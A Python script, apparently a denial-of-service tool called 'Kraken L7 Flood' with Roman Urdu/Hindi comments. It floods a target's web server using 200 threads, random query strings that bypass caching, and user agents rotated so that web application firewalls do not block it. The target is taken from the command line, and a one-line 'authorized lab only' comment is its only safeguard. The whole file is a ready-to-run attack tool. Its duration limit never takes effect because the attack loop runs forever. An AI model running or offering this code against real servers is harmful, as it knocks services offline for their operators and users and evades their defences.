#!/usr/bin/env python3
# Layer-7 HTTP Flood (Cache Bypass / Resource Exhaustion)
# SIRF AUTHORIZED LAB / APNE SERVER PAR CHALAYEIN
import socket
import random
import threading
import time
import sys

TARGET_IP = "127.0.0.1"   # <-- APNA LAB/TARGET IP YAHAN
TARGET_PORT = 80
THREADS = 200
DURATION = 60             # Kitne seconds tak chalana hai

# Random user agents taake WAF block na kare
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Cache bypass + heavy query
            path = f"/?{random.randint(1, 99999999)}={random.randint(1, 99999999)}"
            ua = random.choice(user_agents)
            
            # Request jo server par CPU load daale
            req = f"GET {path} HTTP/1.1\r\nHost: {TARGET_IP}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
            
            s.send(req.encode())
            
            # Response read karo taake server busy rahe
            try:
                s.recv(4096)
            except:
                pass
            s.close()
        except:
            pass

def start():
    print(f"[*] Kraken L7 Flood shuru: {TARGET_IP}:{TARGET_PORT} | {THREADS} threads | {DURATION}s")
    end_time = time.time() + DURATION
    
    def worker():
        while time.time() < end_time:
            attack()
            
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
    print("[!] Attack khatam.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_IP = sys.argv[1]
    if len(sys.argv) > 2:
        THREADS = int(sys.argv[2])
    if len(sys.argv) > 3:
        DURATION = int(sys.argv[3])
    start()
